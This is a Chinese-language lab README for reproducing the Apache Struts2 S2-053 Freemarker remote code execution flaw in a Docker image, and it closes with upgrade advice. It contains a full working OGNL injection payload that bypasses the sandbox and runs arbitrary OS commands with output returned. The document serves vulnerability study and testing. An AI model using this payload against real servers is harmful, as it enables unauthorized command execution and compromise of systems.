## Struts2 Freemarker tags 远程代码执行漏洞(S2-053)环境

### 漏洞信息

 * [S2-053 公告](https://cwiki.apache.org/confluence/display/WW/S2-053)

### 获取环境:

1. 拉取镜像到本地

 ```
$ docker pull medicean/vulapps:s_struts2_s2-053
 ```

2. 启动环境

 ```
$ docker run -d -p 80:8080 medicean/vulapps:s_struts2_s2-053
 ```
 > `-p 80:8080` 前面的 80 代表物理机的端口，可随意指定。 

### 使用与利用

访问 `http://你的 IP 地址:端口号/`

#### PoC

1. 访问 Demo 页面, 随便输入值，可看到页面输出我们提交的值

 ![](https://github.com/Medicean/VulApps/raw/master/s/struts2/s2-053/poc-1.png)

2. 在输入框中输入 `%{100-3}`，然后提交，发现 `%{}` 中的表达式被执行

 ![](https://github.com/Medicean/VulApps/raw/master/s/struts2/s2-053/poc-2.png)

#### Exp

命令执行 Exp(有回显):

```
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

替换Exp中的 `(#cmd='whoami')` 中的命令即可

 ![](https://github.com/Medicean/VulApps/raw/master/s/struts2/s2-053/exp-1.png)

### 修复建议

升级Apache struts 至 2.5.12 版本 或者 2.3.34 版本

### 参考链接

* [S2-053 公告](https://cwiki.apache.org/confluence/display/WW/S2-053)
* [S2-053 复现分析过程(附POC) - 猎户攻防实验室](https://mp.weixin.qq.com/s/4CiKgVn7Y-hWUKRjgECsuA)
